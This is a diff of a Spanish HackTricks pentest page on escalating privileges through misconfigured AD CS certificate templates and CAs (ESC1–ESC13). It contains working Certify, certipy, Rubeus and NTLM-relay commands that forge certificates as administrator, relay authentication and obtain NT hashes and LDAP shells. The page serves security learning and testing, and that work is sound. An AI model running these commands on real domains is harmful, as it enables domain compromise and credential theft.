@@ -2,7 +2,6 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-
 **Este es un resumen de las secciones de técnicas de escalación de las publicaciones:**
 
 - [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
@@ -20,8 +19,8 @@
 - **No se necesitan firmas de personal autorizado.**
 - **Los descriptores de seguridad en las plantillas de certificado son excesivamente permisivos, permitiendo a usuarios de bajo privilegio obtener derechos de inscripción.**
 - **Las plantillas de certificado están configuradas para definir EKUs que facilitan la autenticación:**
-- Se incluyen identificadores de Uso Extendido de Clave (EKU) como Autenticación de Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de Cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de Sesión con Tarjeta Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier Propósito (OID 2.5.29.37.0), o sin EKU (SubCA).
-- **La plantilla permite a los solicitantes incluir un subjectAltName en la Solicitud de Firma de Certificado (CSR):**
+- Se incluyen identificadores de Uso de Clave Extendida (EKU) como Autenticación de Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de Cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de Sesión con Tarjeta Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier Propósito (OID 2.5.29.37.0), o sin EKU (SubCA).
+- **La capacidad para que los solicitantes incluyan un subjectAltName en la Solicitud de Firma de Certificado (CSR) es permitida por la plantilla:**
 - Active Directory (AD) prioriza el subjectAltName (SAN) en un certificado para la verificación de identidad si está presente. Esto significa que al especificar el SAN en un CSR, se puede solicitar un certificado para suplantar a cualquier usuario (por ejemplo, un administrador de dominio). Si un SAN puede ser especificado por el solicitante se indica en el objeto AD de la plantilla de certificado a través de la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia de la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite la especificación del SAN por el solicitante.
 
 > [!CAUTION]
@@ -43,12 +42,12 @@ Para **abusar de esta vulnerabilidad para hacerse pasar por un administrador** s
 Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
 ```
-Luego puedes transformar el **certificado generado a formato `.pfx`** y usarlo para **autenticarte usando Rubeus o certipy** nuevamente:
+Luego puedes transformar el **certificado a formato `.pfx`** y usarlo para **autenticarte usando Rubeus o certipy** nuevamente:
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
-Los binarios de Windows "Certreq.exe" y "Certutil.exe" se pueden utilizar para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
+Los binarios de Windows "Certreq.exe" y "Certutil.exe" se pueden usar para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
 La enumeración de plantillas de certificados dentro del esquema de configuración del bosque de AD, específicamente aquellas que no requieren aprobación o firmas, que poseen un EKU de Autenticación de Cliente o Inicio de Sesión con Tarjeta Inteligente, y con la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, se puede realizar ejecutando la siguiente consulta LDAP:
 ```
@@ -66,11 +65,11 @@ El segundo escenario de abuso es una variación del primero:
 4. Un descriptor de seguridad excesivamente permisivo en la plantilla de certificado otorga derechos de inscripción de certificado a usuarios de bajo privilegio.
 5. **La plantilla de certificado está definida para incluir el EKU de Cualquier Propósito o ningún EKU.**
 
-El **EKU de Cualquier Propósito** permite que un atacante obtenga un certificado para **cualquier propósito**, incluida la autenticación de cliente, la autenticación de servidor, la firma de código, etc. La misma **técnica utilizada para ESC3** se puede emplear para explotar este escenario.
+El **EKU de Cualquier Propósito** permite que un atacante obtenga un certificado para **cualquier propósito**, incluyendo autenticación de cliente, autenticación de servidor, firma de código, etc. La misma **técnica utilizada para ESC3** se puede emplear para explotar este escenario.
 
 Los certificados con **sin EKUs**, que actúan como certificados de CA subordinada, pueden ser explotados para **cualquier propósito** y **también pueden ser utilizados para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKUs o campos arbitrarios en los nuevos certificados utilizando un certificado de CA subordinada.
 
-Sin embargo, los nuevos certificados creados para **la autenticación de dominio** no funcionarán si la CA subordinada no es confiable por el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. No obstante, un atacante aún puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían ser potencialmente **abusados** para una amplia gama de propósitos (por ejemplo, firma de código, autenticación de servidor, etc.) y podrían tener implicaciones significativas para otras aplicaciones en la red como SAML, AD FS o IPSec.
+Sin embargo, los nuevos certificados creados para **autenticación de dominio** no funcionarán si la CA subordinada no es confiable por el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. No obstante, un atacante aún puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían ser potencialmente **abusados** para una amplia gama de propósitos (por ejemplo, firma de código, autenticación de servidor, etc.) y podrían tener implicaciones significativas para otras aplicaciones en la red como SAML, AD FS o IPSec.
 
 Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del Bosque de AD, se puede ejecutar la siguiente consulta LDAP:
 ```
@@ -80,7 +79,7 @@ Para enumerar las plantillas que coinciden con este escenario dentro del esquema
 
 ### Explicación
 
-Este escenario es como el primero y el segundo, pero **abusando** de un **EKU** **diferente** (Agente de Solicitud de Certificado) y **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos),
+Este escenario es como el primero y el segundo, pero **abusando** de un **EKU** diferente (Agente de Solicitud de Certificado) y **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).
 
 El **EKU de Agente de Solicitud de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Agente de Inscripción** en la documentación de Microsoft, permite a un principal **inscribirse** para un **certificado** en **nombre de otro usuario**.
 
@@ -88,7 +87,7 @@ El **“agente de inscripción”** se inscribe en tal **plantilla** y utiliza e
 
 **Requisitos 1:**
 
-- Los derechos de inscripción son otorgados a usuarios de bajo privilegio por la CA Empresarial.
+- Se otorgan derechos de inscripción a usuarios de bajo privilegio por la CA Empresarial.
 - Se omite el requisito de aprobación del gerente.
 - No hay requisito de firmas autorizadas.
 - El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo, otorgando derechos de inscripción a usuarios de bajo privilegio.
@@ -97,8 +96,8 @@ El **“agente de inscripción”** se inscribe en tal **plantilla** y utiliza e
 **Requisitos 2:**
 
 - La CA Empresarial otorga derechos de inscripción a usuarios de bajo privilegio.
-- Se omite la aprobación del gerente.
-- La versión del esquema de la plantilla es 1 o excede 2, y especifica un Requisito de Emisión de Política de Aplicación que requiere el EKU de Agente de Solicitud de Certificado.
+- Se elude la aprobación del gerente.
+- La versión del esquema de la plantilla es 1 o supera 2, y especifica un Requisito de Emisión de Política de Aplicación que requiere el EKU de Agente de Solicitud de Certificado.
 - Un EKU definido en la plantilla de certificado permite la autenticación de dominio.
 - No se aplican restricciones para agentes de inscripción en la CA.
 
@@ -118,9 +117,9 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
-Los **usuarios** que están autorizados a **obtener** un **certificado de agente de inscripción**, las plantillas en las que se permite a los **agentes** de inscripción inscribirse, y las **cuentas** en nombre de las cuales el agente de inscripción puede actuar pueden ser restringidos por las CA empresariales. Esto se logra abriendo el `certsrc.msc` **complemento**, **haciendo clic derecho en la CA**, **haciendo clic en Propiedades**, y luego **navegando** a la pestaña “Agentes de Inscripción”.
+Los **usuarios** que están autorizados para **obtener** un **certificado de agente de inscripción**, las plantillas en las que se permite a los **agentes** de inscripción inscribirse, y las **cuentas** en nombre de las cuales el agente de inscripción puede actuar pueden ser restringidos por las CAs empresariales. Esto se logra abriendo el `certsrc.msc` **complemento**, **haciendo clic derecho en la CA**, **haciendo clic en Propiedades**, y luego **navegando** a la pestaña “Agentes de Inscripción”.
 
-Sin embargo, se observa que la configuración **predeterminada** para las CA es “**No restringir agentes de inscripción**.” Cuando la restricción sobre los agentes de inscripción es habilitada por los administradores, configurándola en “Restringir agentes de inscripción,” la configuración predeterminada sigue siendo extremadamente permisiva. Permite el acceso a **Todos** para inscribirse en todas las plantillas como cualquier persona.
+Sin embargo, se observa que la configuración **predeterminada** para las CAs es “**No restringir agentes de inscripción**.” Cuando la restricción sobre los agentes de inscripción es habilitada por los administradores, configurándola a “Restringir agentes de inscripción,” la configuración predeterminada sigue siendo extremadamente permisiva. Permite el acceso a **Todos** para inscribirse en todas las plantillas como cualquier persona.
 
 ## Control de Acceso a Plantillas de Certificado Vulnerables - ESC4
 
@@ -128,12 +127,12 @@ Sin embargo, se observa que la configuración **predeterminada** para las CA es 
 
 El **descriptor de seguridad** en las **plantillas de certificado** define los **permisos** específicos que los **principales de AD** poseen con respecto a la plantilla.
 
-Si un **atacante** posee los **permisos** necesarios para **alterar** una **plantilla** e **instituir** cualquier **mala configuración explotable** descrita en **secciones anteriores**, se podría facilitar la escalada de privilegios.
+Si un **atacante** posee los **permisos** requeridos para **alterar** una **plantilla** e **instituir** cualquier **mala configuración explotable** descrita en **secciones anteriores**, se podría facilitar la escalada de privilegios.
 
 Los permisos notables aplicables a las plantillas de certificado incluyen:
 
 - **Owner:** Otorga control implícito sobre el objeto, permitiendo la modificación de cualquier atributo.
-- **FullControl:** Habilita autoridad completa sobre el objeto, incluyendo la capacidad de alterar cualquier atributo.
+- **FullControl:** Habilita autoridad completa sobre el objeto, incluida la capacidad de alterar cualquier atributo.
 - **WriteOwner:** Permite la alteración del propietario del objeto a un principal bajo el control del atacante.
 - **WriteDacl:** Permite el ajuste de controles de acceso, potencialmente otorgando a un atacante FullControl.
 - **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.
@@ -150,7 +149,7 @@ Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, per
 ```bash
 certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
 ```
-**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el **parámetro `-save-old` para guardar la configuración antigua**, lo que será útil para **restaurar** la configuración después de nuestro ataque.
+**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el **`-save-old` parameter para guardar la configuración antigua**, lo que será útil para **restaurar** la configuración después de nuestro ataque.
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -161,9 +160,9 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
-## Control de Acceso a Objetos PKI Vulnerables - ESC5
+## Vulnerable PKI Object Access Control - ESC5
 
-### Explicación
+### Explanation
 
 La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos más allá de las plantillas de certificados y la autoridad de certificación, puede afectar la seguridad de todo el sistema AD CS. Estos objetos, que pueden afectar significativamente la seguridad, abarcan:
 
@@ -175,19 +174,19 @@ La seguridad del sistema PKI puede verse comprometida si un atacante de bajo pri
 
 ## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
-### Explicación
+### Explanation
 
-El tema discutido en el [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también toca las implicaciones de la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, como lo describe Microsoft. Esta configuración, cuando se activa en una Autoridad de Certificación (CA), permite la inclusión de **valores definidos por el usuario** en el **nombre alternativo del sujeto** para **cualquier solicitud**, incluidas aquellas construidas a partir de Active Directory®. En consecuencia, esta disposición permite a un **intruso** inscribirse a través de **cualquier plantilla** configurada para la **autenticación** de dominio—específicamente aquellas abiertas a la inscripción de usuarios **no privilegiados**, como la plantilla de Usuario estándar. Como resultado, se puede asegurar un certificado, permitiendo al intruso autenticarse como un administrador de dominio o **cualquier otra entidad activa** dentro del dominio.
+El tema discutido en el [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también toca las implicaciones de la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, como lo describe Microsoft. Esta configuración, cuando se activa en una Autoridad de Certificación (CA), permite la inclusión de **valores definidos por el usuario** en el **nombre alternativo del sujeto** para **cualquier solicitud**, incluidas aquellas construidas a partir de Active Directory®. En consecuencia, esta disposición permite a un **intruso** inscribirse a través de **cualquier plantilla** configurada para la **autenticación** de dominio—específicamente aquellas abiertas a la inscripción de usuarios **no privilegiados**, como la plantilla estándar de Usuario. Como resultado, se puede asegurar un certificado, permitiendo al intruso autenticarse como un administrador de dominio o **cualquier otra entidad activa** dentro del dominio.
 
-**Nota**: El enfoque para agregar **nombres alternativos** en una Solicitud de Firma de Certificado (CSR), a través del argumento `-attrib "SAN:"` en `certreq.exe` (denominado “Pares de Nombre y Valor”), presenta un **contraste** con la estrategia de explotación de SANs en ESC1. Aquí, la distinción radica en **cómo se encapsula la información de la cuenta**—dentro de un atributo de certificado, en lugar de una extensión.
+**Note**: El enfoque para agregar **nombres alternativos** en una Solicitud de Firma de Certificado (CSR), a través del argumento `-attrib "SAN:"` en `certreq.exe` (denominado “Name Value Pairs”), presenta un **contraste** con la estrategia de explotación de SANs en ESC1. Aquí, la distinción radica en **cómo se encapsula la información de la cuenta**—dentro de un atributo de certificado, en lugar de una extensión.
 
-### Abuso
+### Abuse
 
 Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 ```
-Esta operación emplea esencialmente **acceso remoto al registro**, por lo tanto, un enfoque alternativo podría ser:
+Esta operación emplea esencialmente **remote registry access**, por lo tanto, un enfoque alternativo podría ser:
 ```bash
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
 ```
@@ -228,11 +227,11 @@ Esto proporciona información sobre los derechos principales, a saber, **`Manage
 
 Tener derechos de **`ManageCA`** en una autoridad de certificación permite al principal manipular configuraciones de forma remota utilizando PSPKI. Esto incluye activar el flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier plantilla, un aspecto crítico de la escalación de dominio.
 
-La simplificación de este proceso se puede lograr mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, que permite modificaciones sin interacción directa con la GUI.
+La simplificación de este proceso es alcanzable a través del uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, permitiendo modificaciones sin interacción directa con la GUI.
 
 La posesión de derechos de **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, eludiendo efectivamente la salvaguarda de "aprobación del gerente de certificados de CA".
 
-Se puede utilizar una combinación de módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
+Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
 ```powershell
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
@@ -253,7 +252,7 @@ Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 #### Explicación
 
 > [!WARNING]
-> En el **ataque anterior**, se utilizaron los permisos **`Manage CA`** para **habilitar** la bandera **EDITF_ATTRIBUTESUBJECTALTNAME2** para realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que el servicio CA (`CertSvc`) sea reiniciado. Cuando un usuario tiene el derecho de acceso **`Manage CA`**, también se le permite **reiniciar el servicio**. Sin embargo, **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6 puede no funcionar de inmediato** en la mayoría de los entornos parcheados debido a las actualizaciones de seguridad de mayo de 2022.
+> En el **ataque anterior**, se utilizaron permisos de **`Manage CA`** para **habilitar** el flag **EDITF_ATTRIBUTESUBJECTALTNAME2** para realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que el servicio CA (`CertSvc`) sea reiniciado. Cuando un usuario tiene el derecho de acceso **`Manage CA`**, también se le permite **reiniciar el servicio**. Sin embargo, **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6 puede no funcionar de inmediato** en la mayoría de los entornos parcheados debido a las actualizaciones de seguridad de mayo de 2022.
 
 Por lo tanto, aquí se presenta otro ataque.
 
@@ -263,7 +262,7 @@ Requisitos previos:
 - Permiso **`Manage Certificates`** (puede ser otorgado desde **`ManageCA`**)
 - La plantilla de certificado **`SubCA`** debe estar **habilitada** (puede ser habilitada desde **`ManageCA`**)
 
-La técnica se basa en el hecho de que los usuarios con el derecho de acceso **`Manage CA`** _y_ **`Manage Certificates`** pueden **emitir solicitudes de certificado fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Así, un **usuario** puede **solicitar** inscribirse en la **`SubCA`** - lo cual será **denegado** - pero **luego emitido por el gerente posteriormente**.
+La técnica se basa en el hecho de que los usuarios con el derecho de acceso **`Manage CA`** _y_ **`Manage Certificates`** pueden **emitir solicitudes de certificados fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Así, un **usuario** puede **solicitar** inscribirse en el **`SubCA`** - lo cual será **denegado** - pero **luego emitido por el gerente posteriormente**.
 
 #### Abuso
 
@@ -319,17 +318,17 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '785.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
-## NTLM Relay a Puntos Finales HTTP de AD CS – ESC8
+## NTLM Relay a los Puntos Finales HTTP de AD CS – ESC8
 
 ### Explicación
 
 > [!NOTE]
 > En entornos donde **AD CS está instalado**, si existe un **punto final de inscripción web vulnerable** y al menos una **plantilla de certificado está publicada** que permite **inscripción de computadoras de dominio y autenticación de clientes** (como la plantilla **`Machine`** por defecto), se vuelve posible que **cualquier computadora con el servicio de spooler activo sea comprometida por un atacante**!
 
-Varios **métodos de inscripción basados en HTTP** son soportados por AD CS, disponibles a través de roles de servidor adicionales que los administradores pueden instalar. Estas interfaces para la inscripción de certificados basada en HTTP son susceptibles a **ataques de retransmisión NTLM**. Un atacante, desde una **máquina comprometida, puede suplantar cualquier cuenta de AD que se autentique a través de NTLM entrante**. Al suplantar la cuenta de la víctima, estas interfaces web pueden ser accedidas por un atacante para **solicitar un certificado de autenticación de cliente utilizando las plantillas de certificado `User` o `Machine`**.
+Varios **métodos de inscripción basados en HTTP** son soportados por AD CS, disponibles a través de roles de servidor adicionales que los administradores pueden instalar. Estas interfaces para la inscripción de certificados basada en HTTP son susceptibles a **ataques de retransmisión NTLM**. Un atacante, desde una **máquina comprometida, puede suplantar cualquier cuenta de AD que se autentique a través de NTLM entrante**. Mientras suplantan la cuenta de la víctima, estas interfaces web pueden ser accedidas por un atacante para **solicitar un certificado de autenticación de cliente utilizando las plantillas de certificado `User` o `Machine`**.
 
 - La **interfaz de inscripción web** (una aplicación ASP más antigua disponible en `http://<caserver>/certsrv/`), por defecto solo admite HTTP, lo que no ofrece protección contra ataques de retransmisión NTLM. Además, permite explícitamente solo la autenticación NTLM a través de su encabezado HTTP de Autorización, haciendo que métodos de autenticación más seguros como Kerberos sean inaplicables.
-- El **Servicio de Inscripción de Certificados** (CES), el **Servicio Web de Política de Inscripción de Certificados** (CEP) y el **Servicio de Inscripción de Dispositivos de Red** (NDES) por defecto soportan la autenticación negotiate a través de su encabezado HTTP de Autorización. La autenticación negotiate **soporta tanto** Kerberos como **NTLM**, permitiendo a un atacante **reducir a NTLM** la autenticación durante ataques de retransmisión. Aunque estos servicios web habilitan HTTPS por defecto, HTTPS solo **no protege contra ataques de retransmisión NTLM**. La protección contra ataques de retransmisión NTLM para servicios HTTPS solo es posible cuando HTTPS se combina con el enlace de canal. Lamentablemente, AD CS no activa la Protección Extendida para la Autenticación en IIS, que es necesaria para el enlace de canal.
+- El **Servicio de Inscripción de Certificados** (CES), el **Servicio Web de Política de Inscripción de Certificados** (CEP) y el **Servicio de Inscripción de Dispositivos de Red** (NDES) por defecto soportan la autenticación negotiate a través de su encabezado HTTP de Autorización. La autenticación negotiate **soporta tanto** Kerberos como **NTLM**, permitiendo a un atacante **reducir a NTLM** la autenticación durante ataques de retransmisión. Aunque estos servicios web habilitan HTTPS por defecto, HTTPS por sí solo **no protege contra ataques de retransmisión NTLM**. La protección contra ataques de retransmisión NTLM para servicios HTTPS solo es posible cuando HTTPS se combina con el enlace de canal. Lamentablemente, AD CS no activa la Protección Extendida para la Autenticación en IIS, que es necesaria para el enlace de canal.
 
 Un **problema** común con los ataques de retransmisión NTLM es la **corta duración de las sesiones NTLM** y la incapacidad del atacante para interactuar con servicios que **requieren firma NTLM**.
 
@@ -347,7 +346,7 @@ Otra limitación de los ataques de retransmisión NTLM es que **una máquina con
 
 ### **Abuso**
 
-[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **puntos finales HTTP de AD CS habilitados**:
+[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **puntos finales HTTP AD CS habilitados**:
 ```
 Certify.exe cas
 ```
@@ -381,9 +380,9 @@ execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <
 ```
 #### Abuso con [Certipy](https://github.com/ly4k/Certipy)
 
-La solicitud de un certificado se realiza por Certipy de forma predeterminada en función de la plantilla `Machine` o `User`, determinada por si el nombre de la cuenta que se está retransmitiendo termina en `$`. La especificación de una plantilla alternativa se puede lograr mediante el uso del parámetro `-template`.
+La solicitud de un certificado es realizada por Certipy por defecto basada en la plantilla `Machine` o `User`, determinada por si el nombre de la cuenta que se está retransmitiendo termina en `$`. La especificación de una plantilla alternativa se puede lograr mediante el uso del parámetro `-template`.
 
-Se puede emplear una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Al tratar con controladores de dominio, se requiere la especificación de `-template DomainController`.
+Una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) puede ser empleada para forzar la autenticación. Al tratar con controladores de dominio, se requiere la especificación de `-template DomainController`.
 ```bash
 certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -407,7 +406,7 @@ Las condiciones bajo las cuales la configuración de esta bandera se vuelve sign
 - `StrongCertificateBindingEnforcement` no se ajusta a `2` (siendo la predeterminada `1`), o `CertificateMappingMethods` incluye la bandera `UPN`.
 - El certificado está marcado con la bandera `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración de `msPKI-Enrollment-Flag`.
 - Cualquier EKU de autenticación de cliente está especificado por el certificado.
-- Los permisos `GenericWrite` están disponibles sobre cualquier cuenta para comprometer a otra.
+- Se dispone de permisos `GenericWrite` sobre cualquier cuenta para comprometer a otra.
 
 ### Escenario de Abuso
 
@@ -464,7 +463,7 @@ Inicialmente, el hash de `Jane` se recupera utilizando Credenciales en Sombra, e
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
-Posteriormente, el `userPrincipalName` de `Jane` se altera a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de restricciones.
+Posteriormente, el `userPrincipalName` de `Jane` se altera a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de restricción.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
@@ -476,13 +475,13 @@ El `userPrincipalName` de `Jane` se revierte a su original, `Jane@corp.local`.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-Autenticarse con el certificado obtenido generará el hash NT de `Administrator@corp.local`, lo que requiere la especificación del dominio en el comando debido a la ausencia de detalles del dominio en el certificado.
+Autenticar con el certificado obtenido generará el hash NT de `Administrator@corp.local`, lo que requiere especificar el dominio en el comando debido a la ausencia de detalles del dominio en el certificado.
 ```bash
 certipy auth -pfx administrator.pfx -domain corp.local
 ```
 ### Caso de abuso 2
 
-Con el `CertificateMappingMethods` que contiene el bit flag `UPN` (`0x4`), una cuenta A con permisos de `GenericWrite` puede comprometer cualquier cuenta B que carezca de la propiedad `userPrincipalName`, incluidas las cuentas de máquina y el administrador de dominio incorporado `Administrator`.
+Con el `CertificateMappingMethods` que contiene el bit flag `UPN` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que carezca de la propiedad `userPrincipalName`, incluidas las cuentas de máquina y el administrador de dominio incorporado `Administrator`.
 
 Aquí, el objetivo es comprometer `DC$@corp.local`, comenzando por obtener el hash de `Jane` a través de Shadow Credentials, aprovechando el `GenericWrite`.
 ```bash
@@ -508,13 +507,13 @@ A través de la shell LDAP, comandos como `set_rbcd` habilitan ataques de Delega
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o donde no coincida con el `sAMAccountName`, siendo el `Administrator@corp.local` el objetivo principal debido a sus privilegios LDAP elevados y la ausencia de un `userPrincipalName` por defecto.
+Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o donde no coincida con el `sAMAccountName`, siendo el `Administrator@corp.local` un objetivo principal debido a sus privilegios LDAP elevados y la ausencia de un `userPrincipalName` por defecto.
 
 ## Relaying NTLM to ICPR - ESC11
 
 ### Explicación
 
-Si el servidor CA no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, puede realizar ataques de relé NTLM sin firma a través del servicio RPC. [Referencia aquí](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
+Si el servidor CA no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, puede realizar ataques de relé NTLM sin firma a través del servicio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
 
 Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado y certipy mostrará las vulnerabilidades `ESC11`.
 ```bash
@@ -533,7 +532,7 @@ Enforce Encryption for Requests     : Disabled
 ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
 
 ```
-### Escenario de Abuso
+### Escenario de abuso
 
 Es necesario configurar un servidor de retransmisión:
 ```bash
@@ -620,7 +619,7 @@ OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 
 Encuentra un permiso de usuario que se pueda usar `certipy find` o `Certify.exe find /showAllPermissions`.
 
-Si `John` tiene permiso para inscribirse en `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.
+Si `John` tiene permiso para inscribir `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.
 
 Todo lo que necesita hacer es especificar la plantilla, obtendrá un certificado con derechos OIDToGroupLink.
 ```bash
@@ -628,13 +627,15 @@ certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target 
 ```
 ## Comprometiendo Bosques con Certificados Explicados en Voz Pasiva
 
-### Ruptura de Confianzas de Bosque por CAs Comprometidas
+### Ruptura de Confianzas de Bosque por CAs Comprometidos
 
 La configuración para **inscripción entre bosques** es relativamente sencilla. El **certificado de CA raíz** del bosque de recursos es **publicado en los bosques de cuentas** por los administradores, y los certificados de **CA empresarial** del bosque de recursos son **agregados a los contenedores `NTAuthCertificates` y AIA en cada bosque de cuentas**. Para aclarar, este arreglo otorga a la **CA en el bosque de recursos control total** sobre todos los demás bosques para los cuales gestiona PKI. Si esta CA es **comprometida por atacantes**, los certificados de todos los usuarios en ambos, el bosque de recursos y el bosque de cuentas, podrían ser **falsificados por ellos**, rompiendo así el límite de seguridad del bosque.
 
 ### Privilegios de Inscripción Otorgados a Principales Extranjeros
 
 En entornos de múltiples bosques, se requiere precaución con respecto a las CAs Empresariales que **publican plantillas de certificados** que permiten a **Usuarios Autenticados o principales extranjeros** (usuarios/grupos externos al bosque al que pertenece la CA Empresarial) **derechos de inscripción y edición**.\
-Tras la autenticación a través de una confianza, el **SID de Usuarios Autenticados** es agregado al token del usuario por AD. Así, si un dominio posee una CA Empresarial con una plantilla que **permite derechos de inscripción a Usuarios Autenticados**, una plantilla podría potencialmente ser **inscrita por un usuario de un bosque diferente**. Del mismo modo, si **los derechos de inscripción son otorgados explícitamente a un principal extranjero por una plantilla**, se **crea una relación de control de acceso entre bosques**, permitiendo a un principal de un bosque **inscribirse en una plantilla de otro bosque**.
+Al autenticarse a través de una confianza, el **SID de Usuarios Autenticados** es agregado al token del usuario por AD. Así, si un dominio posee una CA Empresarial con una plantilla que **permite derechos de inscripción a Usuarios Autenticados**, una plantilla podría potencialmente ser **inscrita por un usuario de un bosque diferente**. Del mismo modo, si **los derechos de inscripción son explícitamente otorgados a un principal extranjero por una plantilla**, se **crea una relación de control de acceso entre bosques**, permitiendo que un principal de un bosque **se inscriba en una plantilla de otro bosque**.
 
